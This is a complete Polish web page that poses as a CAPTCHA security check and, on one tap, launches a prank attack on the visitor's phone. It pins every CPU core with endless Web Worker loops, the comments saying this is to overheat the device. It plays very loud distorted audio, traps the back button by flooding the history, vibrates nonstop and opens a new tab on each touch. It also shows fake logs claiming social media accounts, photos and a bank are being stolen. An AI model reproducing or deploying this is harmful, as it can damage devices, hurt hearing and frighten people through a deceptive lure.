<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Weryfikacja Bezpieczeństwa</title>
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden; background-color: #f9f9f9; user-select: none;
            transition: filter 0.1s;
        }

        #captcha-screen {
            display: flex; justify-content: center; align-items: center;
            height: 100vh; width: 100vw; position: absolute; z-index: 1000;
            background: #fff; cursor: pointer; /* Cały ekran jest klikalny jako pułapka */
        }
        .captcha-box {
            border: 1px solid #d3d3d3; border-radius: 3px; background: #fafafa;
            padding: 20px; display: flex; align-items: center; gap: 15px;
            box-shadow: 0px 0px 4px rgba(0,0,0,0.1); width: 280px;
            pointer-events: none; /* Kliknięcie przechodzi na ekran główny */
        }
        .checkbox {
            width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px;
            background: #fff; display: flex; justify-content: center; align-items: center;
        }
        .captcha-text { font-family: 'Arial', sans-serif; font-size: 1.2rem; color: #555; }
        
        #prank-screen {
            display: none; width: 100vw; height: 100vh; position: absolute;
            top: 0; left: 0; z-index: 10; background-color: black;
            color: #00ff00; padding: 10px; box-sizing: border-box;
            flex-direction: column; text-align: left;
        }

        #terminal {
            font-size: 1.1rem; line-height: 1.4; text-shadow: 0 0 3px #00ff00;
            flex-grow: 1; overflow: hidden; white-space: pre-wrap;
        }

        #massive-warning {
            display: none; font-size: 2.2rem; color: red; text-align: center;
            font-weight: 900; background: yellow; padding: 10px;
            border: 5px solid red; animation: blink 0.1s infinite;
            text-transform: uppercase; position: absolute; top: 30%; left: 0; width: 100%;
            box-sizing: border-box;
        }

        #final-text {
            display: none; position: absolute; top: 50%; left: 50%;
            transform: translate(-50%, -50%); width: 90%;
            font-size: 2.5rem; font-weight: 900; color: white;
            text-align: center; text-transform: uppercase;
            text-shadow: 3px 3px 0 #ff0000, -3px -3px 0 #0000ff;
            z-index: 9999; animation: shakeFinal 0.2s infinite;
        }

        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        @keyframes glitchScreen {
            0% { transform: translate(0) scale(1); filter: invert(0); }
            20% { transform: translate(-10px, 10px) scale(1.1); filter: invert(1); }
            40% { transform: translate(10px, -10px) scale(0.9); filter: hue-rotate(90deg); }
            60% { transform: translate(-15px, -5px) scale(1.2) rotate(5deg); filter: invert(1); }
            80% { transform: translate(15px, 5px) scale(1) rotate(-5deg); filter: hue-rotate(180deg); }
            100% { transform: translate(0) scale(1.05); filter: invert(0); }
        }
        @keyframes shakeFinal {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            25% { transform: translate(-52%, -48%) rotate(2deg); }
            50% { transform: translate(-48%, -52%) rotate(-2deg); }
            75% { transform: translate(-51%, -49%) rotate(1deg); }
            100% { transform: translate(-50%, -50%) rotate(0deg); }
        }
    </style>
</head>
<body>

    <!-- Ekran startowy (cały jest klikalny, żeby ominąć blokady przeglądarek) -->
    <div id="captcha-screen">
        <div class="captcha-box">
            <div class="checkbox" id="checkbox-ui"></div>
            <div class="captcha-text">I'm not a robot</div>
        </div>
    </div>

    <!-- Piekło Hakerskie -->
    <div id="prank-screen">
        <div id="terminal"></div>
        <div id="massive-warning">KRYTYCZNA TEMPERATURA!<br>PROCESOR 110°C<br>RYZYKO ZAPŁONU!</div>
    </div>

    <!-- Finał -->
    <div id="final-text">ZOSTAŁEŚ SPRANKOWANY PRZEZ JEREMIASZA FAKTORA</div>

    <script>
        // Flaga zabezpieczająca przed podwójnym kliknięciem
        let isStarted = false;

        document.getElementById('captcha-screen').addEventListener('click', function() {
            if (isStarted) return;
            isStarted = true;

            // Zmiana wizualna CAPTCHA
            document.getElementById('checkbox-ui').innerHTML = '<span style="color: green; font-weight: bold; font-size: 24px;">✔</span>';

            // ==========================================
            // 1. NATYCHMIASTOWE API (omija blokady)
            // ==========================================
            
            // Fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => console.log(e));
            } else if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            // Audio (Włączane natychmiast na życzenie użytkownika)
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const osc1 = audioCtx.createOscillator();
            const osc2 = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            
            osc1.type = 'sawtooth';
            osc2.type = 'square';
            osc1.connect(gain);
            osc2.connect(gain);
            gain.connect(audioCtx.destination);
            gain.gain.value = 1.5; // Maksymalny przester
            osc1.start(); osc2.start();

            // Modulacja dźwięku co ułamek sekundy
            setInterval(() => {
                osc1.frequency.value = Math.random() * 2000 + 500;
                osc2.frequency.value = Math.random() * 3000 + 100;
            }, 80);

            // ==========================================
            // 2. FIZYCZNE NAGRZEWANIE TELEFONU (CPU BURNER)
            // ==========================================
            // Tworzymy kod do "kopania w tle", który zablokuje rdzenie procesora na 100%
            const workerCode = `
                self.onmessage = function() {
                    let i = 0;
                    while(true) {
                        i += Math.sqrt(Math.random() * Math.random());
                    }
                };
            `;
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            const workerUrl = URL.createObjectURL(blob);
            
            // Pobieramy ilość rdzeni telefonu (lub domyślnie 8) i odpalamy skrypt na każdym z nich
            const cores = navigator.hardwareConcurrency || 8;
            for (let i = 0; i < cores; i++) {
                const worker = new Worker(workerUrl);
                worker.postMessage('start');
            }

            // ==========================================
            // 3. START WIZUALNEGO PRANKU I WIBRACJI
            // ==========================================
            document.getElementById('captcha-screen').style.display = 'none';
            document.getElementById('prank-screen').style.display = 'flex';

            // Pułapka "Wstecz"
            for (let i = 0; i < 50; i++) history.pushState(null, null, location.href);
            window.onpopstate = function () { history.pushState(null, null, location.href); };

            // Wibracje
            if (navigator.vibrate) {
                setInterval(() => navigator.vibrate([200, 50, 500, 50, 1000, 50]), 500);
            }

            // Pułapka kartowa - każde dotknięcie w panice klonuje stronę
            document.body.addEventListener('touchstart', function() {
                try { window.open(window.location.href, '_blank'); } catch(e) {}
            });

            // Teksty w terminalu
            const terminal = document.getElementById('terminal');
            const logs = [
                "Nawiązywanie połączenia TCP/IP...",
                "Omijanie zapory sieciowej: SUKCES",
                "Podnoszenie uprawnień do roota...",
                "Wykryto urządzenie mobilne. Rozpoczynam klonowanie.",
                "-> Wylogowywanie z: TikTok... [OK]",
                "-> Zmiana głównego hasła... [OK]",
                "-> Pobieranie archiwum wiadomości z Instagrama...",
                "-> Instagram: 4.2GB POBRANO",
                "-> Wylogowywanie z: Instagram... [OK]",
                "-> Łamanie pinu do Snapchat 'My Eyes Only'...",
                "-> Snapchat: Pobieranie ukrytych zdjęć... [OK]",
                "-> Logowanie do aplikacji bankowej...",
                "!!! OSTRZEŻENIE SYSTEMOWE !!!",
                "Przeciążenie procesora! rdzeń 1: 100%, rdzeń 2: 100%",
                "-> Udostępnianie lokalizacji na Facebooku...",
                "Formatowanie karty pamięci...",
                "Usuwanie systemu Android..."
            ];

            let logIndex = 0;
            const logInterval = setInterval(() => {
                if (logIndex < logs.length) {
                    terminal.innerHTML += logs[logIndex] + "<br>";
                    // Auto-scroll w dół
                    terminal.scrollTop = terminal.scrollHeight;
                    logIndex++;
                } else {
                    // Start glitchy i czerwonego błędu
                    document.getElementById('massive-warning').style.display = 'block';
                    document.body.style.animation = "glitchScreen 0.1s infinite";
                }
            }, 800); // Linijka pojawia się co 0.8 sekundy

            // ==========================================
            // 4. FINAŁ
            // ==========================================
            setTimeout(() => {
                clearInterval(logInterval);
                document.body.style.animation = "none";
                document.body.style.filter = "none";
                document.body.style.transform = "none";
                
                document.getElementById('prank-screen').style.display = 'none';
                document.body.style.backgroundColor = '#000';
                
                document.getElementById('final-text').style.display = 'block';
                
                // Pisk zmienia się w mroczny, głęboki dźwięk
                osc1.frequency.value = 80;
                osc2.frequency.value = 85;
            }, 18000); // Chaos trwa dokładnie 18 sekund
        });
    </script>
</body>
</html>
